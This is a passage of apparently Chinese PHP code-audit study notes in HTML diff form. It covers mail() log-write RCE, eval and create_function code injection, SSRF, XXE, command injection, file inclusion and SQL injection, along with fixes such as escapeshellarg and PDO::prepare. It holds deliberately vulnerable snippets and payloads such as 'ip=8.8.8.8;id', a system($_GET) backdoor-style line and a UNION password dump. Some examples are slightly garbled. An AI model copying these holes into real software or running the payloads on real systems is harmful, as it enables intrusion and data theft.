+执行后，查看log文件 /var/www/html/rce.php
+</p>
+
+<div class="org-src-container">
+<pre class="src src-sh">17220 &lt;&lt;&lt; To: Alice@example.com
+17220 &lt;&lt;&lt; Subject: Hello Alice!
+17220 &lt;&lt;&lt; X-PHP-Originating-Script: 0:test.php
+17220 &lt;&lt;&lt; CC: somebodyelse@example.com
+17220 &lt;&lt;&lt;
+17220 &lt;&lt;&lt; &lt;?php phpinfo(); ?&gt;
+17220 &lt;&lt;&lt; [EOF]
+</pre>
+</div>
+
+<p>
+发现被写入了包含在邮件标题或正文中的php代码，通过访问此log文件可以执行预先可控的php代码。
+</p>
+
+<p>
+因此，对php mail函数使用时，应该特别注意第5个参数 additional_parameters 的使用，防止被攻击者可控，注入 -X 参数，执行命令。
+</p>
+
+<p>
+<b>修复方案</b>
+</p>
+
+<p>
+方案一：使用过滤函数内置函数 escapeshellcmd(), escapeshellarg() ,过滤和转义输入中的特殊字符
+</p>
+
+<ul class="org-ul">
+<li><p>
+escapeshellcmd()：会在以下字符之前插入反斜线（\）： &amp;#;`|*?~&lt;&gt;^()[]{}$\, \x0A 和 \xFF。 ' 和 " 仅在不配对儿的时候被转义。
+</p>
+
+<p>
+在 Windows 平台上，所有这些字符以及 % 和 ! 字符都会被空格代替。
+</p></li>
+
+<li>escapeshellarg()：将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号，这样以确保能够直接将一个字符串传入 shell 函数，并且还是确保安全的。对于用户输入的部分参数就应该使用这个函数。</li>
+</ul>
+</div>
+</div>
+<div id="outline-container-h:6bd9b26d-1694-412b-9907-58b867cd0b80" class="outline-4">
+<h4 id="h:6bd9b26d-1694-412b-9907-58b867cd0b80"><a href="#h:6bd9b26d-1694-412b-9907-58b867cd0b80">代码注入/文件包含函数</a></h4>
+<div class="outline-text-4" id="text-h:6bd9b26d-1694-412b-9907-58b867cd0b80">
+<p>
+函数/语法结构 描述 例子
+</p>
+<div class="org-src-container">
+<pre class="src src-sh"><span class="org-builtin">eval</span> &#23558;&#20256;&#20837;&#30340;&#21442;&#25968;&#20869;&#23481;&#20316;&#20026;PHP&#20195;&#30721;&#25191;&#34892; eval &#19981;&#26159;&#20989;&#25968; &#26159;&#19968;&#31181;&#35821;&#27861;&#32467;&#26500;&#19981;&#33021;&#24403;&#20570;&#20989;&#25968;&#21160;&#24577;&#35843;&#29992;
+<span class="org-builtin">eval</span>(<span class="org-string">'phpinfo();'</span>);
+
+assert &#23558;&#20256;&#20837;&#30340;&#21442;&#25968;&#20869;&#23481;&#20316;&#20026;PHP&#20195;&#30721;&#25191;&#34892; &#29256;&#26412;&#22312;PHP7&#20197;&#19979;&#26159;&#20989;&#25968;PHP7&#21450;&#20197;&#19978;&#20026;&#35821;&#27861;&#32467;&#26500;
+<span class="org-function-name">assert</span>(<span class="org-string">'phpinfo();'</span>);
+
+preg_replace &#24403;preg_replace&#20351;&#29992;/e&#20462;&#39280;&#31526;&#19988;&#21407;&#23383;&#31526;&#20018;&#21487;&#25511;&#26102;&#26102; &#26377;&#21487;&#33021;&#25191;&#34892;php&#20195;&#30721;
+<span class="org-builtin">echo</span> preg_replace(<span class="org-string">"/e"</span>,<span class="org-string">"{${PHPINFO()}}"</span>,<span class="org-string">"123"</span>);
+
+call_user_func &#25226;&#31532;&#19968;&#20010;&#21442;&#25968;&#20316;&#20026;&#22238;&#35843;&#20989;&#25968;&#35843;&#29992; &#38656;&#35201;&#20004;&#20010;&#21442;&#25968;&#37117;&#23436;&#20840;&#21487;&#25511;&#25165;&#21487;&#21033;&#29992; &#21482;&#33021;&#20256;&#20837;&#19968;&#20010;&#21442;&#25968;&#35843;&#29992;
+<span class="org-function-name">call_user_func</span>(<span class="org-string">'assert'</span>,<span class="org-string">'phpinfo();'</span>);
+
+call_user_func_array &#21516;call_user_func &#21487;&#20256;&#20837;&#19968;&#20010;&#25968;&#32452;&#24102;&#20837;&#22810;&#20010;&#21442;&#25968;&#35843;&#29992;&#20989;&#25968;
+<span class="org-function-name">call_user_func_array</span>(<span class="org-string">'file_put_contents'</span>,[<span class="org-string">'1.txt'</span>,<span class="org-string">'6666'</span>]);
+
+create_function &#26681;&#25454;&#20256;&#36882;&#30340;&#21442;&#25968;&#21019;&#24314;&#21311;&#21517;&#20989; &#25968;&#65292;&#24182;&#20026;&#20854;&#36820;&#22238;&#21807;&#19968;&#21517;&#31216; &#21033;&#29992;&#38656;&#35201;&#31532;&#20108;&#20010;&#21442;&#25968;&#21487;&#25511; &#19988;&#21019;&#24314;&#30340;&#20989;&#25968;&#34987;&#25191;&#34892;
+$<span class="org-variable-name">f</span> = create_function(<span class="org-string">''</span>,<span class="org-string">'system($_GET[123]);'</span>);
+$<span class="org-variable-name">f</span>();
+
+include &#21253;&#21547;&#24182;&#36816;&#34892;&#25351;&#23450;&#25991;&#20214; &#25191;&#34892;&#20986;&#38169;&#20250;&#25243;&#20986;&#38169;&#35823;
+include <span class="org-string">'vars.php'</span>; (&#25324;&#21495;&#21487;&#26377;&#21487;&#26080;)
+
+require &#21516;include &#25191;&#34892;&#20986;&#38169;&#20250;&#25243;&#20986;&#35686;&#21578;
+<span class="org-function-name">require</span>(<span class="org-string">'somefile.php'</span>); (&#25324;&#21495;&#21487;&#26377;&#21487;&#26080;)
+
+require_once &#21516;require &#20294;&#20250;&#26816;&#26597;&#20043;&#21069;&#26159;&#21542;&#24050;&#32463;&#21253;&#21547;&#35813;&#25991;&#20214; &#30830;&#20445;&#19981;&#37325;&#22797;&#21253;&#21547;
+
+include_once &#21516;include &#20294;&#20250;&#26816;&#26597;&#20043;&#21069;&#26159;&#21542;&#24050;&#32463;&#21253;&#21547;&#35813;&#25991;&#20214; &#30830;&#20445;&#19981;&#37325;&#22797;&#21253;&#21547;
+</pre>
+</div>
+
+<p>
+示例：
+</p>
+
+<div class="org-src-container">
+<pre class="src src-php">&lt;?php
+eval('phpinfo();');
+assert('phpinfo();');
+echo preg_replace("/e","{${PHPINFO()}}","123");
+call_user_func('assert', 'phpinfo();');
+call_user_func_array('file_put_contents', ['1.txt','6666']);
+$f = create_function('','system($_ GET[123]);'); $f();
+include 'vars.php';
+require('somefile.php');
+</pre>
+</div>
+</div>
+</div>
+</div>
+<div id="outline-container-h:598bb5ce-c04f-4e24-b2ae-eb2f2adebdfe" class="outline-3">
+<h3 id="h:598bb5ce-c04f-4e24-b2ae-eb2f2adebdfe"><a href="#h:598bb5ce-c04f-4e24-b2ae-eb2f2adebdfe">文件读取/SSRF函数</a></h3>
+<div class="outline-text-3" id="text-h:598bb5ce-c04f-4e24-b2ae-eb2f2adebdfe">
+<ul class="org-ul">
+<li>file_get_contents 读入文件返回字符串。危害：内网探测</li>
+</ul>
+<div class="org-src-container">
+<pre class="src src-php">echo file_get_contents("flag.txt"); 
+echo file_get_contents("https://www.bilibili.com/");
+</pre>
+</div>
+
+<ul class="org-ul">
+<li>curl_setopt  和 curl_exec Curl访问url获取信息 <a href="https://www.php.net/manual/zh/function.curl-exec.php">https://www.php.net/manual/zh/function.curl-exec.php</a></li>
+</ul>
+<div class="org-src-container">
+<pre class="src src-php">function curl($url){
+  $ch = curl_init(); 
+  curl_setopt($ch, CURLOPT_URL, $url);
+  curl_exec($ch); 
+  curl_close($ch); 
+} 
+$url =$_GET['url'];
+curl($url);
+</pre>
+</div>
+
+<ul class="org-ul">
+<li>fsockopen 打开一个套接字连接(远程tcp/udp raw) <a href="https://www.php.net/manual/zh/function.fsockopen.php">https://www.php.net/manual/zh/function.fsockopen.php</a></li>
+
+<li>readfile 读取一个文件，并写入到输出缓冲。同file_get_contents</li>
+
+<li>fopen/fread/fgets/fgetss/fgetc/fgetcsv/fpassthru/fscanf 打开文件或者 URL 读取文件流</li>
+</ul>
+<div class="org-src-container">
+<pre class="src src-php">$file = fopen("test.txt","r"); 
+echo fread($file,"1234"); 
+fclose($file);
+</pre>
+</div>
+
+<ul class="org-ul">
+<li>file 把整个文件读入一个数组中</li>
+<li>highlight_file/show_source 语法高亮一个文件</li>
+<li>parse_ini_file 读取并解析一个ini配置文件</li>
+<li>simplexml_load_file 读取文件作为XML文档解析</li>
+</ul>
+
+<div class="org-src-container">
+<pre class="src src-php">echo implode('', file('https://www.bilibili.com/ '));
+
+highlight_file("1.php");
+
+print_r(parse_ini_file('1.ini'));
+</pre>
+</div>
+
+<p>
+范例：
+</p>
+<div class="org-src-container">
+<pre class="src src-php">&lt;?php
+echo file_get_contents("flag.txt");
+echo file_get_contents("https://www.bilibili.com/");
+
+$file = fopen("test.txt","r");
+echo fread($file,"1234");
+fclose($file);
+
+echo implode('', file('https://www.bilibili.com/ '));
+
+highlight_file("1.php");
+
+print_r(parse_ini_file('1.ini'));
+</pre>
+</div>
+
+<div class="org-src-container">
+<pre class="src src-php">$fp = fsockopen("www.example.com", 80, $errno, $errstr, 30);
+if (!$fp) {
+  echo "$errstr ($errno)&lt;br /&gt;\n";
+} else {
+  $out = "GET / HTTP/1.1\r\n";
+  $out .= "Host: www.example.com\r\n";
+  $out .= "Connection: Close\r\n\r\n";
+  fwrite($fp, $out);
+  while (!feof($fp)) {
+    echo fgets($fp, 128);
+  }
+  fclose($fp);
+}
+</pre>
+</div>
+
+<p>
+SSRF的危害？
+</p>
+<ul class="org-ul">
+<li>不能访问内网，IP地址不可以</li>
+</ul>
+
+<p>
+防御
+</p>
+<ul class="org-ul">
+<li>限制只能访问自己公司的公网域名</li>
+</ul>
+</div>
+</div>
+<div id="outline-container-h:f357707e-19c4-4e48-b7fb-465e54b6cf05" class="outline-3">
+<h3 id="h:f357707e-19c4-4e48-b7fb-465e54b6cf05"><a href="#h:f357707e-19c4-4e48-b7fb-465e54b6cf05">文件上传/写入/其他函数</a></h3>
+<div class="outline-text-3" id="text-h:f357707e-19c4-4e48-b7fb-465e54b6cf05">
+<div class="org-src-container">
+<pre class="src src-sh">file_put_contents &#23558;&#19968;&#20010;&#23383;&#31526;&#20018;&#20889;&#20837;&#25991;&#20214;
+<span class="org-function-name">file_put_contents</span>(<span class="org-string">"test.txt"</span>,<span class="org-string">"xxx"</span>);
+
+move_uploaded_file &#23558;&#19978;&#20256;&#30340;&#20020;&#26102;&#25991;&#20214;&#31227;&#21160;&#21040;&#26032;&#30340;&#20301;&#32622;
+<span class="org-function-name">move_uploaded_file</span>($<span class="org-variable-name">_FILES</span>[ <span class="org-string">"pictures"</span>][<span class="org-string">"tmp_name"</span>],<span class="org-string">"xxx.php"</span>)
+
+rename &#37325;&#21629;&#21517;&#25991;&#20214;/&#30446;&#24405;
+<span class="org-function-name">rename</span>($<span class="org-variable-name">oldname</span>,$<span class="org-variable-name">newname</span>);
+
+rmdir &#21024;&#38500;&#30446;&#24405;
+
+mkdir &#21019;&#24314;&#30446;&#24405;
+
+unlink &#21024;&#38500;&#25991;&#20214;
+
+copy &#22797;&#21046;&#25991;&#20214;
+<span class="org-function-name">copy</span>($<span class="org-variable-name">file</span>, $<span class="org-variable-name">newfile</span>);
+
+fopen/fputs/fwrite &#25171;&#24320;&#25991;&#20214;&#25110;&#32773; URL
+https://www.php.net/manual/zh/function.fwrite.php
+
+link &#21019;&#24314;&#25991;&#20214;&#30828;&#38142;&#25509;
+<span class="org-function-name">link</span>($<span class="org-variable-name">target</span>, $<span class="org-variable-name">link</span>);
+
+symlink &#21019;&#24314;&#31526;&#21495;&#38142;&#25509;(&#36719;&#38142;&#25509;)
+<span class="org-function-name">symlink</span>($<span class="org-variable-name">target</span>, $<span class="org-variable-name">link</span>);
+
+tmpfile &#21019;&#24314;&#19968;&#20010;&#20020;&#26102;&#25991;&#20214; (&#22312;&#20020;&#26102;&#30446;&#24405;&#23384;&#25918; &#38543;&#26426;&#25991;&#20214;&#21517; &#36820;&#22238;&#21477;&#26564;)
+$<span class="org-variable-name">temp</span> = tmpfile(); 
+<span class="org-function-name">fwrite</span>($<span class="org-variable-name">temp</span>, <span class="org-string">"123456"</span>);
+<span class="org-function-name">fclose</span>($<span class="org-variable-name">temp</span>);
+
+Thinkphp &#25991;&#20214;&#19978;&#20256;: https://www.kancloud.cn/manual/thinkphp5/155159
+<span class="org-function-name">request</span>()-&gt;file()-&gt;move()
+<span class="org-function-name">request</span>()-&gt;file()-&gt;file()
+$<span class="org-variable-name">file</span> = request()-&gt;file($<span class="org-variable-name">name</span>);
+$<span class="org-variable-name">file</span>-&gt;move($<span class="org-variable-name">filepath</span>);
+
+extractTo &#35299;&#21387;ZIP&#21040;&#30446;&#24405;
+
+DOMDocument loadXML simplexml_import_dom
+&#21152;&#36733;&#35299;&#26512; XML &#26377;&#21487;&#33021;&#23384;&#22312; XXE &#28431;&#27934;&#65292;file_get_contents &#33719;&#21462;&#23458;&#25143;&#31471;&#36755;&#20837;&#20869;&#23481; new DOMDocument()
+&#21021;&#22987;&#21270;XML&#35299;&#26512;&#22120; loadXML($<span class="org-variable-name">xmlfile</span>)&#21152;&#36733;&#23458;&#25143;&#31471;&#36755;&#20837;&#30340;XML&#20869;&#23481;simplexml_import_dom($<span class="org-variable-name">dom</span>)&#33719;&#21462;XML&#25991;&#26723;&#33410;&#28857;
+&#22914;&#26524;&#25104;&#21151;&#21017;&#36820;&#22238;SimpleXMLElement&#23545;&#35937;&#65292;&#22914;&#26524;&#22833;&#36133;&#21017;&#36820;&#22238;FALSE&#12290;
+&lt;?php $<span class="org-variable-name">xmlfile</span> = file_get_contents(<span class="org-string">'php://input'</span>);
+$<span class="org-variable-name">dom</span> = new DOMDocument();
+$<span class="org-variable-name">dom</span>-&gt;loadXML($<span class="org-variable-name">xmlfile</span>);
+$<span class="org-variable-name">xml</span> = simplexml_import_dom($<span class="org-variable-name">dom</span>);
+$<span class="org-variable-name">xxe</span> = $<span class="org-variable-name">xml</span>-&gt;xxe;
+$<span class="org-variable-name">str</span> = <span class="org-string">"$xxe \n"</span>;
+<span class="org-builtin">echo</span> $<span class="org-variable-name">str</span>;
+
+simplexml_load_string &#21152;&#36733;&#35299;&#26512;XML&#23383;&#31526;&#20018;&#65292;&#26377;&#21487;&#33021;&#23384;&#22312;XXE&#28431;&#27934;
+$<span class="org-variable-name">xml</span>=simplexml_load_string($<span class="org-variable-name">_REQUEST</span>[<span class="org-string">'xml'</span>]);
+<span class="org-function-name">print_r</span>($<span class="org-variable-name">xml</span>);
+
+simplexml_load_file &#35835;&#21462;&#25991;&#20214;&#20316;&#20026;XML&#25991;&#26723;&#35299;&#26512; &#26377;&#21487;&#33021;&#23384;&#22312;XXE &#28431;&#27934;
+
+unserialize &#21453;&#24207;&#21015;&#21270;
+</pre>
+</div>
+</div>
+<div id="outline-container-h:847b0b7c-cfcb-4873-a6a2-0ab7b61c079b" class="outline-4">
+<h4 id="h:847b0b7c-cfcb-4873-a6a2-0ab7b61c079b"><a href="#h:847b0b7c-cfcb-4873-a6a2-0ab7b61c079b">安全分享</a></h4>
+<div class="outline-text-4" id="text-h:847b0b7c-cfcb-4873-a6a2-0ab7b61c079b">
+<p>
+Java文件上传要不要控制？
+</p>
+<ul class="org-ul">
+<li>要控制。上传的java文件无法直接执行，用到多种漏洞组合，如反序列化</li>
+<li>但要先处理高风险的漏洞。像这种组合的漏洞，可以优先级很低些。</li>
+</ul>
+</div>
+</div>
+<div id="outline-container-h:0c052aba-c4df-4822-a26b-c3eca1a39f92" class="outline-4">
+<h4 id="h:0c052aba-c4df-4822-a26b-c3eca1a39f92"><a href="#h:0c052aba-c4df-4822-a26b-c3eca1a39f92">过滤函数</a></h4>
+<div class="outline-text-4" id="text-h:0c052aba-c4df-4822-a26b-c3eca1a39f92">
+<p>
+PHP原生过滤方法
+</p>
+
+<ol class="org-ol">
+<li>escapeshellarg 传入参数添加单引号并转义原有单引号 用于防止命令注入。
+<ul class="org-ul">
+<li>例：传入 ' id # 处理后 '\' id #' 处理后的字符串可安全的添加到命令执行参数escapeshellcmd 转义字符串中的特殊符号 用于防止命令注入反斜线（\）会在以下字符之前插入： &amp;#;`|*?~&lt;&gt;^()[]{}$\, \x0A 和 \xFF。 ' 和 " 仅在不配对儿的时候被转义</li>
+</ul></li>
+
+<li>addslashes 在单引号（'）、双引号（"）、反斜线（\）与 NUL前加上反斜线 可用于防止SQL注入</li>
+</ol>
+
+<div class="org-src-container">
+<pre class="src src-sh">PDO::quote &#36716;&#20041;&#29305;&#27530;&#23383;&#31526; &#24182;&#28155;&#21152;&#24341;&#21495;
+PDO::prepare &#39044;&#22788;&#29702;SQL&#35821;&#21477; &#26377;&#25928;&#38450;&#27490;SQL&#27880;&#20837; (&#25512;&#33616;)
+htmlspecialchars &#21644; htmlentities &#23558;&#29305;&#27530;&#23383;&#31526;&#36716;&#20041;&#25104;html&#23454;&#20307; &#21487;&#29992;&#20110;&#38450;&#27490;XSS
+<span class="org-function-name">intval</span>($<span class="org-variable-name">input</span>) floatval() floatval() floor() (int)$<span class="org-variable-name">input</span> num+***<span class="org-string">\*</span>0<span class="org-string">\*</span>*** &#23558;&#36755;&#20837;&#24378;&#21046;&#36716;&#25442;&#20026;&#25972;&#25968;/&#28014;&#28857; &#24120;&#35265;&#20110;&#38450;&#27490;SQL&#27880;&#20837;
+</pre>
+</div>
+</div>
+</div>
+</div>
+<div id="outline-container-h:4c46b139-01ca-4a67-86fb-d72a6bc3d4f1" class="outline-3">
+<h3 id="h:4c46b139-01ca-4a67-86fb-d72a6bc3d4f1"><a href="#h:4c46b139-01ca-4a67-86fb-d72a6bc3d4f1">命令注入</a></h3>
+<div class="outline-text-3" id="text-h:4c46b139-01ca-4a67-86fb-d72a6bc3d4f1">
+<p>
+将用户输入拼接到命令行中执行 导致的任意命令执行问题
+</p>
+
+<p>
+例子
+</p>
+<div class="org-src-container">
+<pre class="src src-sh">&lt;?php
+$<span class="org-variable-name">command</span> = <span class="org-string">'ping -c 4 '</span>.$<span class="org-variable-name">_GET</span>[<span class="org-string">'ip'</span>];
+<span class="org-function-name">system</span>($<span class="org-variable-name">command</span>); //system&#20989;&#25968;&#29305;&#24615; &#25191;&#34892;&#32467;&#26524;&#20250;&#33258;&#21160;&#25171;&#21360;
+</pre>
+</div>
+
+<p>
+执行ping 命令并输出内容正常输入: /xxx.php?ip=8.8.8.8
+</p>
+
+<p>
+执行命令 ping -c 4 8.8.8.8，由于ip参数没有任何过滤限制，所以攻击者可以这样输入: /xxx.php?ip=8.8.8.8;id
+</p>
+
+<p>
+执行命令 ping -c 1 8.8.8.8;id，这样就可以执行攻击者定义的命令 id
+</p>
+
+<p>
+通常在实际审计时输入常常不会非常简单都有复杂的处理，需要慢慢追踪参数来源。
+</p>
+
+<p>
+在审计时遇到输入可控时 要检查是否存在escapeshellarg escapeshellcmd 函数转义 或者是其他的处理方法(如强制类型转换 替换字符 等)
+</p>
+</div>
+<div id="outline-container-h:5986f687-50f9-4625-9081-11253175d8d6" class="outline-4">
+<h4 id="h:5986f687-50f9-4625-9081-11253175d8d6"><a href="#h:5986f687-50f9-4625-9081-11253175d8d6">常见bash shell</a></h4>
+<div class="outline-text-4" id="text-h:5986f687-50f9-4625-9081-11253175d8d6">
+<div class="org-src-container">
+<pre class="src src-sh">&#31526;&#21495; &#25551;&#36848; &#31034;&#20363;
+&lt;&#12289;&gt; &#36755;&#20837;&#36755;&#20986;&#37325;&#23450;&#21521; echo abc &gt;1.txt
+
+;&#20998;&#21495; &#25353;&#29031;&#20174;&#24038;&#21040;&#21491;&#39034;&#24207;&#25191;&#34892;&#21629;&#20196; id;whoami;ls
+
+| &#31649;&#36947;&#31526; &#23558;&#24038;&#20391;&#21629;&#20196;&#30340;&#36755;&#20986;&#20316;&#20026;&#21491;&#20391;&#21629;&#20196;&#30340;&#36755;&#20837; ps -aux|grep root
+
+&amp;&amp; &#25353;&#29031;&#20174;&#24038;&#21040;&#21491;&#39034;&#24207;&#25191;&#34892;&#21629;&#20196; &#21482;&#26377;&#25191;&#34892;&#25104;&#21151;&#25165;&#25191;&#34892;&#21518;&#38754;&#30340;&#35821;&#21477;
+
+|| &#25353;&#29031;&#20174;&#24038;&#21040;&#21491;&#39034;&#24207;&#25191;&#34892;&#21629;&#20196; &#21482;&#26377;&#25191;&#34892;&#22833;&#36133;&#25165;&#25191;&#34892;&#21518;&#38754;&#30340;&#35821;&#21477;
+</pre>
+</div>
+
+<p>
+代码注入
+</p>
+
+<p>
+将用户输入拼接到PHP代码中执行 导致的任意代码执行问题
+</p>
+
+<p>
+例如使用 eval 等代码执行函数
+</p>
+<div class="org-src-container">
+<pre class="src src-php">&lt;?php eval(@$_GET['xxx']);
+</pre>
+</div>
+
+<p>
+输入: xxx=phpinfo(); 执行 phpinfo() 函数，执行系统命令使用 xxx=system(''cmd'');
+</p>
+<div class="org-src-container">
+<pre class="src src-sh">&#20989;&#25968;/&#35821;&#27861;&#32467;&#26500; &#25551;&#36848; &#20363;&#23376;
+<span class="org-builtin">eval</span> &#23558;&#20256;&#20837;&#30340;&#21442;&#25968;&#20869;&#23481;&#20316;&#20026;PHP&#20195;&#30721;&#25191;&#34892; eval &#19981;&#26159;&#20989;&#25968;&#65292;&#26159;&#19968;&#31181;&#35821;&#27861;&#32467;&#26500;&#65292;&#19981;&#33021;&#24403;&#20570;&#20989;&#25968;&#21160;&#24577;&#35843;&#29992;
+<span class="org-builtin">eval</span>(<span class="org-string">'phpinfo();'</span>);
+
+assert &#23558;&#20256;&#20837;&#30340;&#21442;&#25968;&#20869;&#23481;&#20316;&#20026;PHP&#20195;&#30721;&#25191;&#34892; &#29256;&#26412;&#22312;PHP7&#20197;&#19979;&#26159;&#20989;&#25968;&#65292;PHP7&#21450;&#20197;&#19978;&#20026;&#35821;&#27861;&#32467;&#26500;
+<span class="org-function-name">assert</span>(<span class="org-string">'phpinfo();'</span>);
+
+preg_replace &#24403;preg_replace&#20351;&#29992;/e&#20462;&#39280;&#31526;&#19988;&#21407;&#23383;&#31526;&#20018;&#21487;&#25511;&#26102;&#26102; &#26377;&#21487;&#33021;&#25191;&#34892;php&#20195;&#30721;
+<span class="org-builtin">echo</span> preg_replace(<span class="org-string">"/e"</span>,<span class="org-string">"{${PHPINFO()}}"</span>,<span class="org-string">"123"</span>);
+
+call_user_func &#25226;&#31532;&#19968;&#20010;&#21442;&#25968;&#20316;&#20026;&#22238;&#35843;&#20989;&#25968;&#35843;&#29992; &#38656;&#35201;&#20004;&#20010;&#21442;&#25968;&#37117;&#23436;&#20840;&#21487;&#25511;&#25165;&#21487;&#21033;&#29992;&#65292;&#21482;&#33021;&#20256;&#20837;&#19968;&#20010;&#21442;&#25968;&#35843;&#29992;
+<span class="org-function-name">call_user_func</span>(<span class="org-string">'assert'</span>,<span class="org-string">'phpinfo();'</span>);
+
+call_user_func_array &#21516;call_user_func &#21487;&#20256;&#20837;&#19968;&#20010;&#25968;&#32452;&#24102;&#20837;&#22810;&#20010;&#21442;&#25968;&#35843;&#29992;&#20989;&#25968;
+<span class="org-function-name">call_user_func_array</span>(<span class="org-string">'file_put_contents'</span>,[<span class="org-string">'1.txt'</span>,<span class="org-string">'6666'</span>]);
+
+create_function &#26681;&#25454;&#20256;&#36882;&#30340;&#21442;&#25968;&#21019;&#24314;&#21311;&#21517;&#20989; &#25968;&#65292;&#24182;&#20026;&#20854;&#36820;&#22238;&#21807;&#19968;&#21517;&#31216; &#21033;&#29992;&#38656;&#35201;&#31532;&#20108;&#20010;&#21442;&#25968;&#21487;&#25511; &#19988;&#21019;&#24314;&#30340;&#20989;&#25968;&#34987;&#25191;&#34892;
+$<span class="org-variable-name">f</span> = create_function(<span class="org-string">''</span>,<span class="org-string">'system($_GET[123]);'</span>); $<span class="org-variable-name">f</span>();
+</pre>
+</div>
+</div>
+</div>
+</div>
+<div id="outline-container-h:322961ff-c690-46ba-8a8a-374509c5b84b" class="outline-3">
+<h3 id="h:322961ff-c690-46ba-8a8a-374509c5b84b"><a href="#h:322961ff-c690-46ba-8a8a-374509c5b84b">文件包含</a></h3>
+<div class="outline-text-3" id="text-h:322961ff-c690-46ba-8a8a-374509c5b84b">
+<p>
+将远程/本地文件 包含入当前页面的PHP代码并执行 详细加载执行原理见<a href="https://www.kancloud.cn/nickbai/php7/363301">PHP7内核剖析</a>
+</p>
+
+<p>
+例子
+</p>
+
+<p>
+开发人员希望自己写的页面实现更加灵活的加载
+</p>
+
+<div class="org-src-container">
+<pre class="src src-php">&lt;?php
+$file = $_GET['page'];
+include(“pages/$file”);
+?&gt;
+</pre>
+</div>
+
+<p>
+正常输入 ?page=login.php
+</p>
+<div class="org-src-container">
+<pre class="src src-php">&lt;?php
+$file = $_GET['page'];
+/*
+pages/login.php 文件代码被包含执行
+*/
+?&gt;
+</pre>
+</div>
+
+<p>
+服务器包含并执行pages目录下的login.php 攻击者输入 ?page=../image/123.jpg
+</p>
+
+<p>
+服务器包含并执行pages的上层目录image目录下的123.jpg
+</p>
+
+<p>
+该漏洞通常需要参数后半部分可控或者参数完全可控才存在
+</p>
+
+<p>
+文件包含利用方法
+</p>
+<ul class="org-ul">
+<li>包含上传文件 (上传头像图片等)</li>
+<li>包含 data:// php://filter 或 php://input 伪协议 (php.ini allow_url_include 设置为 on) 包含日志 Apache nginx 等web服务器访问日志 SSH FTP 等登陆错误日志 PHP框架日志</li>
+<li>包含 session文件 (通常在临时目录下 (linux <i>tmp</i> ) sess_会话ID文件) PHP间接或直接创建的其他文件 比如数据库文件 缓存文件 应用日志等</li>
+</ul>
+
+<table>
+
+
+<colgroup>
+<col  class="org-left">
+
+<col  class="org-left">
+
+<col  class="org-left">
+</colgroup>
+<thead>
+<tr>
+<th scope="col" class="org-left">函数/语法结构</th>
+<th scope="col" class="org-left">描述</th>
+<th scope="col" class="org-left">例子</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td class="org-left">include</td>
+<td class="org-left">包含并运行指定文件 执行出错会抛出错误。</td>
+<td class="org-left">include 'vars.php'; (括号可有可无)</td>
+</tr>
+
+<tr>
+<td class="org-left">require</td>
+<td class="org-left">同include 执行出错会抛出警告。</td>
+<td class="org-left">require('somefile.php'); (括号可有可无)</td>
+</tr>
+
+<tr>
+<td class="org-left">require_once</td>
+<td class="org-left">同require 但会检查之前是否已经包含该文件 确保不重复包含</td>
+<td class="org-left">&#xa0;</td>
+</tr>
+
+<tr>
+<td class="org-left">include_once</td>
+<td class="org-left">同include 但会检查之前是否已经包含该文件 确保不重复包含</td>
+<td class="org-left">&#xa0;</td>
+</tr>
+</tbody>
+</table>
+</div>
+</div>
+<div id="outline-container-h:05c483b4-04f4-4baf-9e21-b2db08846904" class="outline-3">
+<h3 id="h:05c483b4-04f4-4baf-9e21-b2db08846904"><a href="#h:05c483b4-04f4-4baf-9e21-b2db08846904">SQL注入</a></h3>
+<div class="outline-text-3" id="text-h:05c483b4-04f4-4baf-9e21-b2db08846904">
+<p>
+将用户输入拼接到数据库将要执行的SQL语句中 导致攻击者可以修改原有执行的SQL语句
+</p>
+</div>
+<div id="outline-container-h:9bce2f32-1167-4636-8b94-0e9880937b24" class="outline-4">
+<h4 id="h:9bce2f32-1167-4636-8b94-0e9880937b24"><a href="#h:9bce2f32-1167-4636-8b94-0e9880937b24">例子</a></h4>
+<div class="outline-text-4" id="text-h:9bce2f32-1167-4636-8b94-0e9880937b24">
+<div class="org-src-container">
+<pre class="src src-php">&lt;?php
+include('conn.php');//数据库连接省略
+$sql = "SELECT id, name FROM users WHERE id=$_GET['id']";
+$result = $mysqli-&gt;query($sql);
+if ($result-&gt;num_rows &gt; 0) {
+    while($row = $result-&gt;fetch_assoc()) {
+        echo "id: " . $row["id"]. " - Name: " . $row["name"]; 9 }
+} else {
+    echo "没有查询到结果"; 12 }
+?&gt;
+</pre>
+</div>
+
+<p>
+正常请求 ?id=123 执行SQL
+</p>
+
+<div class="org-src-container">
+<pre class="src src-sh">1 SELECT id, name FROM users WHERE <span class="org-variable-name">id</span>=123;
+</pre>
+</div>
+
+<p>
+攻击者构造请求:
+</p>
+<div class="org-src-container">
+<pre class="src src-sh">?<span class="org-variable-name">id</span>=123 UNION SELECT name,password FROM users; &#25191;&#34892;SQL
+
+SELECT id, name FROM users WHERE <span class="org-variable-name">id</span>=123 UNION SELECT name,password FROM users;
+</pre>
+</div>
+
+<p>
+攻击者改变了原有的SQL语句逻辑
+</p>
+
+<p>
+以下为使用PDO连接MySql数据库的实例：
+</p>
+<div class="org-src-container">
+<pre class="src src-php">&lt;?php
+$type = 'mysql';
+$hostname = '127.0.0.1';
+$dbname = 'xxx';
+$username = 'root';
+$password = 'root';
+try {
+    $dsn = sprintf('%s:dbname=%s;host=%s;charset=utf8', $type, $dbname, $hostname);
+    //初始化一个PDO对象
+    $pdo = new PDO($dsn, $username, $password, [
+    PDO::ATTR_ERRMODE =&gt; PDO::ERRMODE_EXCEPTION //开启异常模式
+     ]);
+} catch (PDOException $e) {
+    die ("Database error: " . $e-&gt;getMessage());
+}
+$input_data=1; // 假设input_dta 为用户输入数据
+$smt = $pdo-&gt;query('SELECT * FROM t_user WHERE id='.$input_dta);
+$data = $smt-&gt;fetchAll(PDO::FETCH_ASSOC);
+var_dump($data);
+?&gt;
+</pre>
+</div>
+
+<p>
+PDO 类：
+</p>
+<ul class="org-ul">
+<li><a href="https://www.runoob.com/php/pdo-begintransaction.html">PDO::beginTransaction</a> — 启动一个事务</li>
+<li><a href="https://www.runoob.com/php/pdo-commit.html">PDO::commit</a> — 提交一个事务</li>
+<li><a href="https://www.runoob.com/php/pdo-construct.html">PDO::__construct</a> — 创建一个表示数据库连接的 PDO 实例</li>
+<li><a href="https://www.runoob.com/php/pdo-errorcode.html">PDO::errorCode</a> — 获取跟数据库句柄上一次操作相关的 SQLSTATE</li>
